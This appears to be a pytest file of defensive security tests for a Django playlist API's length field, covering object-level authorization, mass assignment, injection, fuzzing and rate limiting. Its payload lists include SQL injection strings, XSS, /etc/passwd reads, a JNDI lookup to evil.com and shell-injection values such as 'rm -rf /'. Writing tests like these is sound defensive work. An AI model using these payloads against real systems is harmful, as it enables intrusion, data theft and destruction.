"""T287: Playlist length field redteam security tests.

Tests for BOLA, BOPLA, injection vulnerabilities in playlist length field.
"""

import json

from datetime import timedelta

import pytest

from model_bakery import baker
from rest_framework.test import APIClient

from api.core.models import User
from api.schedule.models import Playlist

# SecLists payloads for fuzzing
NAUGHTY_STRINGS = [
    "",
    "null",
    "undefined",
    "true",
    "false",
    "-1",
    "99999999999999999999",
    "1/0",
    "0/0",
    "-2147483648",
    "<script>alert(1)</script>",
    "'; DROP TABLE cc_playlist; --",
    "' OR '1'='1",
    "../../../etc/passwd",
    "file:///etc/passwd",
    "${jndi:ldap://evil.com}",
    "${7*7}",
    "{{7*7}}",
    "%s%s%s%s%s%s%s%s%s",
    "\\x00",
    "\\x00\\x00",
    "🎵🎶🎼",
    "日本語",
    "<img src=x onerror=alert(1)>",
    "' UNION SELECT * FROM cc_user--",
    "; cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "| ls -la",
    "&& rm -rf /",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT null,null,null--",
    "1; DROP TABLE cc_playlist--",
    "' AND 1=1--",
    "' AND 1=2--",
    "1' OR '1'='1",
    '1" OR "1"="1',
    "%' OR '0'='0",
    "'/**/OR/**/'1'='1",
    "'+OR+'1'='1",
]

TIME_FORMAT_ATTACKS = [
    "not-a-time",
    "99:99:99",
    "25:00:00",
    "12:60:00",
    "12:30:70",
    "-01:00:00",
    "01:-01:00",
    "01:00:-01",
    "01:00",
    "1:00:00",
    "01:00:00:00",
    "PT1H30M",
    "1h30m",
    "3600",
    "3600.5",
    "Infinity",
    "NaN",
    " 01:00:00 ",
    "\t01:00:00\t",
    "\n01:00:00\n",
    "01:00:00\x00",
]


class TestPlaylistLengthBOLA:
    """BOLA: Broken Object Level Authorization tests."""

    @pytest.mark.django_db
    @pytest.mark.xfail(
        reason="T806: BOLA - no ownership check in PlaylistViewSet",
    )
    def test_bola_retrieve_other_users_playlist_length(
        self,
        guest_client,
        faker,
    ):
        """Attacker can retrieve victim's playlist including length field."""
        victim = baker.make(User, username=f"victim_{faker.user_name()}")
        attacker = baker.make(User, username=f"attacker_{faker.user_name()}")

        victim_playlist = baker.make(
            Playlist,
            name="Victim Private Playlist",
            owner=victim,
            length=timedelta(hours=2, minutes=30),
        )

        # Attacker tries to access victim's playlist
        client = APIClient()
        client.force_authenticate(user=attacker)

        response = client.get(f"/api/v2/playlists/{victim_playlist.id}")

        # Should be 403, but API returns 200 (BOLA vulnerability)
        assert (
            response.status_code == 403
        ), f"T806: BOLA - attacker accessed victim playlist (got {response.status_code})"

    @pytest.mark.django_db
    @pytest.mark.xfail(
        reason="T807: BOLA - LIST shows all playlists, no owner filtering",
    )
    def test_bola_list_shows_all_playlists(self, guest_client, faker):
        """LIST returns all playlists regardless of owner."""
        victim = baker.make(User, username=f"victim_{faker.user_name()}")
        attacker = baker.make(User, username=f"attacker_{faker.user_name()}")

        # Create victim's private playlist
        victim_playlist = baker.make(
            Playlist,
            name="Victim Secret Playlist",
            owner=victim,
            length=timedelta(minutes=45),
        )

        client = APIClient()
        client.force_authenticate(user=attacker)

        response = client.get("/api/v2/playlists")

        assert response.status_code == 200
        data = response.json()
        playlist_names = [p.get("name") for p in data]
        assert (
            "Victim Secret Playlist" not in playlist_names
        ), "T807: BOLA - LIST shows victim's private playlists"

    @pytest.mark.django_db
    @pytest.mark.xfail(
        reason="T808: BOLA - attacker can update victim's playlist",
    )
    def test_bola_update_other_users_playlist_length(self, guest_client, faker):
        """Attacker can update victim's playlist length."""
        victim = baker.make(User, username=f"victim_{faker.user_name()}")
        attacker = baker.make(User, username=f"attacker_{faker.user_name()}")

        victim_playlist = baker.make(
            Playlist,
            name="Victim Playlist",
            owner=victim,
            length=timedelta(minutes=30),
        )

        client = APIClient()
        client.force_authenticate(user=attacker)

        response = client.patch(
            f"/api/v2/playlists/{victim_playlist.id}",
            json.dumps({"length": "99:99:99"}),
            content_type="application/json",
        )

        assert response.status_code in [
            403,
            404,
        ], f"T808: BOLA - attacker updated victim's playlist (got {response.status_code})"

    @pytest.mark.django_db
    @pytest.mark.xfail(
        reason="T809: BOLA - attacker can delete victim's playlist",
    )
    def test_bola_delete_other_users_playlist(self, guest_client, faker):
        """Attacker can delete victim's playlist."""
        victim = baker.make(User, username=f"victim_{faker.user_name()}")
        attacker = baker.make(User, username=f"attacker_{faker.user_name()}")

        victim_playlist = baker.make(
            Playlist,
            name="Victim Playlist to Delete",
            owner=victim,
            length=timedelta(hours=1),
        )

        client = APIClient()
        client.force_authenticate(user=attacker)

        response = client.delete(f"/api/v2/playlists/{victim_playlist.id}")

        assert response.status_code in [
            403,
            404,
        ], f"T809: BOLA - attacker deleted victim's playlist (got {response.status_code})"


class TestPlaylistLengthBOPLA:
    """BOPLA: Broken Object Property Level Authorization tests."""

    @pytest.mark.django_db
    def test_bopla_mass_assignment_id_field(
        self,
        guest_client,
        admin_user,
        faker,
    ):
        """Try to set id field during CREATE (mass assignment)."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/playlists",
            json.dumps(
                {
                    "id": 999999,
                    "name": "Playlist with custom ID",
                    
                    "length": "01:00:00",
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            data = response.json()
            if data.get("id") == 999999:
                pytest.fail(
                    "T810: BOPLA - mass assignment of id field allowed",
                )

    @pytest.mark.django_db
    @pytest.mark.xfail(
        reason="T811: BOPLA - mass assignment of created_at allowed",
    )
    def test_bopla_mass_assignment_created_at(
        self,
        guest_client,
        admin_user,
        faker,
    ):
        """Try to set created_at during CREATE."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/playlists",
            json.dumps(
                {
                    "name": "Playlist with custom timestamp",
                    
                    "length": "01:00:00",
                    "created_at": "2020-01-01T00:00:00Z",
                },
            ),
            content_type="application/json",
        )

        assert response.status_code == 201
        data = response.json()
        assert "2020" not in str(
            data.get("created_at", ""),
        ), "T811: BOPLA - mass assignment of created_at allowed"

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T812: BOPLA - owner change via PATCH allowed")
    def test_bopla_change_owner_via_update(
        self,
        guest_client,
        admin_user,
        regular_user,
        faker,
    ):
        """Try to change playlist owner via PATCH."""
        playlist = baker.make(
            Playlist,
            name="Test Playlist",
            owner=admin_user,
            length=timedelta(minutes=30),
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.patch(
            f"/api/v2/playlists/{playlist.id}",
            json.dumps({"owner": regular_user.id}),
            content_type="application/json",
        )

        assert response.status_code == 200
        data = response.json()
        assert (
            data.get("owner") != regular_user.id
        ), "T812: BOPLA - owner change via PATCH allowed"

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T813: BOPLA - extra fields silently accepted")
    def test_bopla_extra_fields_not_rejected(
        self,
        guest_client,
        admin_user,
        faker,
    ):
        """Extra fields should be rejected, not silently ignored."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/playlists",
            json.dumps(
                {
                    "name": "Playlist with extra fields",
                    
                    "length": "01:00:00",
                    "is_admin": True,
                    "role": "superuser",
                    "password": "hacked",
                },
            ),
            content_type="application/json",
        )

        # Should reject with 400, not silently accept
        assert (
            response.status_code == 400
        ), f"T813: BOPLA - extra fields silently accepted (got {response.status_code})"


class TestPlaylistLengthInjection:
    """Injection vulnerability tests."""

    @pytest.mark.django_db
    def test_sqli_in_length_field_create(self, guest_client, admin_user):
        """SQL injection in length field during CREATE."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        for payload in SQLI_PAYLOADS[:5]:
            response = client.post(
                "/api/v2/playlists",
                json.dumps(
                    {
                        "name": "SQLi Test",
                        
                        "length": payload,
                    },
                ),
                content_type="application/json",
            )

            # Check for SQL errors in response
            if response.status_code >= 500:
                pytest.fail(
                    f"T814: SQLi in length field causes 500: {payload}",
                )

            response_text = response.content.decode().lower()
            sql_errors = [
                "sql",
                "sqlite",
                "mysql",
                "postgresql",
                "syntax error",
            ]
            for err in sql_errors:
                if err in response_text:
                    pytest.fail(f"T814: SQL error disclosed: {err}")

    @pytest.mark.django_db
    def test_sqli_in_length_field_update(self, guest_client, admin_user):
        """SQL injection in length field during UPDATE."""
        playlist = baker.make(
            Playlist,
            name="Test Playlist",
            owner=admin_user,
            length=timedelta(minutes=30),
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        for payload in SQLI_PAYLOADS[:5]:
            response = client.patch(
                f"/api/v2/playlists/{playlist.id}",
                json.dumps({"length": payload}),
                content_type="application/json",
            )

            if response.status_code >= 500:
                pytest.fail(
                    f"T815: SQLi in length UPDATE causes 500: {payload}",
                )

    @pytest.mark.django_db
    def test_nosql_injection_length_field(self, guest_client, admin_user):
        """NoSQL injection attempts in length field."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
        ]

        for payload in nosql_payloads:
            response = client.post(
                "/api/v2/playlists",
                json.dumps(
                    {
                        "name": "NoSQLi Test",
                        
                        "length": payload,
                    },
                ),
                content_type="application/json",
            )

            # Should reject non-string types
            if response.status_code == 201:
                pytest.fail(
                    f"T816: NoSQL object accepted in length field: {payload}",
                )


class TestPlaylistLengthValidation:
    """Input validation bypass tests."""

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T817: Invalid time format 99:99:99 accepted")
    def test_invalid_time_format_accepted(self, guest_client, admin_user):
        """Invalid time formats should be rejected."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        invalid_formats = [
            "99:99:99",
            "25:00:00",
            "12:60:00",
            "-01:00:00",
        ]

        for fmt in invalid_formats:
            response = client.post(
                "/api/v2/playlists",
                json.dumps(
                    {
                        "name": "Invalid Time Test",
                        
                        "length": fmt,
                    },
                ),
                content_type="application/json",
            )

            assert (
                response.status_code != 201
            ), f"T817: Invalid time format accepted: {fmt}"

    @pytest.mark.django_db
    @pytest.mark.xfail(
        reason="T818: Overflow length value 999999:00:00 accepted",
    )
    def test_overflow_length_value(self, guest_client, admin_user):
        """Very large duration values should be validated."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        overflow_values = [
            "999999:00:00",
            "2147483647:00:00",
        ]

        for val in overflow_values:
            response = client.post(
                "/api/v2/playlists",
                json.dumps(
                    {
                        "name": "Overflow Test",
                        
                        "length": val,
                    },
                ),
                content_type="application/json",
            )

            assert (
                response.status_code != 201
            ), f"T818: Overflow length value accepted: {val}"

    @pytest.mark.django_db
    def test_null_bytes_in_length(self, guest_client, admin_user):
        """Null bytes in length field should be rejected."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/playlists",
            json.dumps(
                {
                    "name": "Null Byte Test",
                    
                    "length": "01:00:00\x00",
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            pytest.fail("T819: Null bytes in length field accepted")


class TestPlaylistLengthFuzzing:
    """Fuzzing tests using SecLists payloads."""

    @pytest.mark.django_db
    def test_fuzzing_length_field(self, guest_client, admin_user):
        """Fuzz length field with naughty strings."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        for payload in NAUGHTY_STRINGS[:15]:
            response = client.post(
                "/api/v2/playlists",
                json.dumps(
                    {
                        "name": f"Fuzz {payload[:20]}",
                        
                        "length": payload,
                    },
                ),
                content_type="application/json",
            )

            # Should not crash
            if response.status_code >= 500:
                pytest.fail(
                    f"T820: Fuzzing payload caused 500: {payload[:50]}",
                )

    @pytest.mark.django_db
    def test_fuzzing_name_field_with_length(self, guest_client, admin_user):
        """Fuzz name field while setting length."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        for payload in NAUGHTY_STRINGS[:10]:
            response = client.post(
                "/api/v2/playlists",
                json.dumps(
                    {
                        "name": payload,
                        
                        "length": "01:00:00",
                    },
                ),
                content_type="application/json",
            )

            if response.status_code >= 500:
                pytest.fail(f"T821: Name fuzzing caused 500: {payload[:50]}")


class TestPlaylistLengthDoS:
    """Denial of Service tests."""

    @pytest.mark.django_db
    def test_very_long_length_string(self, guest_client, admin_user):
        """Very long length string should be rejected."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        long_string = "01:00:00" * 1000  # 8000+ chars

        response = client.post(
            "/api/v2/playlists",
            json.dumps(
                {
                    "name": "Long Length Test",
                    
                    "length": long_string,
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            pytest.fail("T822: Very long length string accepted (DoS risk)")

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T823: No rate limiting on playlist CREATE")
    def test_rapid_create_requests(self, guest_client, admin_user):
        """Rapid CREATE requests should be rate limited."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        responses = []
        for i in range(50):
            response = client.post(
                "/api/v2/playlists",
                json.dumps(
                    {
                        "name": f"Rapid Test {i}",
                        
                        "length": "01:00:00",
                    },
                ),
                content_type="application/json",
            )
            responses.append(response.status_code)

            if response.status_code == 429:
                return  # Rate limiting works

        # All 50 succeeded - no rate limiting
        success_count = sum(1 for r in responses if r == 201)
        assert (
            success_count < 50
        ), "T823: No rate limiting on playlist CREATE (50 requests succeeded)"


class TestPlaylistLengthEdgeCases:
    """Edge case and boundary tests."""

    @pytest.mark.django_db
    def test_zero_length_handling(self, guest_client, admin_user):
        """Zero length should be handled correctly."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/playlists",
            json.dumps(
                {
                    "name": "Zero Length",
                    
                    "length": "00:00:00",
                },
            ),
            content_type="application/json",
        )

        assert response.status_code == 201
        data = response.json()
        assert data.get("length") == "00:00:00"

    @pytest.mark.django_db
    def test_max_valid_length(self, guest_client, admin_user):
        """Maximum reasonable length should be accepted."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/playlists",
            json.dumps(
                {
                    "name": "Max Length",
                    
                    "length": "99:59:59",
                },
            ),
            content_type="application/json",
        )

        # Should either accept or reject with validation error
        if response.status_code not in [201, 400]:
            pytest.fail(
                f"T824: Unexpected status for max length: {response.status_code}",
            )

    @pytest.mark.django_db
    def test_whitespace_in_length(self, guest_client, admin_user):
        """Whitespace in length field should be handled."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/playlists",
            json.dumps(
                {
                    "name": "Whitespace Length",
                    
                    "length": " 01:00:00 ",
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            data = response.json()
            # Should be normalized
            if data.get("length") != "01:00:00":
                pytest.fail("T825: Whitespace not normalized in length field")


class TestPlaylistLengthMethodBypass:
    """HTTP method bypass tests."""

    @pytest.mark.django_db
    def test_put_vs_patch_length_update(self, guest_client, admin_user):
        """PUT should have same validation as PATCH."""
        playlist = baker.make(
            Playlist,
            name="Test Playlist",
            owner=admin_user,
            length=timedelta(minutes=30),
            description="Test description",
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        # Try PUT with partial data (no description)
        response = client.put(
            f"/api/v2/playlists/{playlist.id}",
            json.dumps(
                {
                    "name": "Updated Name",
                    
                    "length": "02:00:00",
                },
            ),
            content_type="application/json",
        )

        # PUT should require all fields or behave consistently
        if response.status_code == 200:
            data = response.json()
            # Check if description was wiped (potential data loss)
            if (
                "description" not in data
                or data.get("description") != "Test description"
            ):
                pytest.fail("T826: PUT wiped existing fields (data loss)")

    @pytest.mark.django_db
    def test_method_override_length_update(self, guest_client, admin_user):
        """Test method override headers."""
        playlist = baker.make(
            Playlist,
            name="Test Playlist",
            owner=admin_user,
            length=timedelta(minutes=30),
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        # Try to override GET with DELETE
        response = client.get(
            f"/api/v2/playlists/{playlist.id}",
            HTTP_X_HTTP_METHOD_OVERRIDE="DELETE",
        )

        # Should not delete on GET
        playlist.refresh_from_db()
        assert playlist is not None  # Still exists


class TestPlaylistLengthInfoDisclosure:
    """Information disclosure tests."""

    @pytest.mark.django_db
    def test_error_message_leaks_structure(self, guest_client, admin_user):
        """Error messages should not leak database structure."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        # Trigger an error with malformed length
        response = client.post(
            "/api/v2/playlists",
            json.dumps(
                {
                    "name": "Error Test",
                    
                    "length": "'; DROP TABLE cc_playlist; --",
                },
            ),
            content_type="application/json",
        )

        if response.status_code >= 400:
            response_text = response.content.decode().lower()
            sensitive_patterns = [
                "cc_playlist",
                "column",
                "table",
                "syntax error",
                "postgresql",
                "sqlite",
                "mysql",
            ]
            for pattern in sensitive_patterns:
                if pattern in response_text:
                    pytest.fail(
                        f"T827: Error message leaks DB structure: {pattern}",
                    )

    @pytest.mark.django_db
    def test_stack_trace_not_exposed(self, guest_client, admin_user):
        """Stack traces should not be exposed in errors."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        # Trigger validation error
        response = client.post(
            "/api/v2/playlists",
            json.dumps(
                {
                    "name": "Stack Trace Test",
                    
                    "length": {"invalid": "structure"},
                },
            ),
            content_type="application/json",
        )

        response_text = response.content.decode().lower()
        stack_patterns = [
            "traceback",
            'file "/',
            "line ",
            "in ",
            "django",
            "python",
        ]
        for pattern in stack_patterns:
            if pattern in response_text and "password" not in response_text:
                # Allow some framework errors but not full stack traces
                if "traceback" in response_text:
                    pytest.fail("T828: Stack trace exposed in error response")
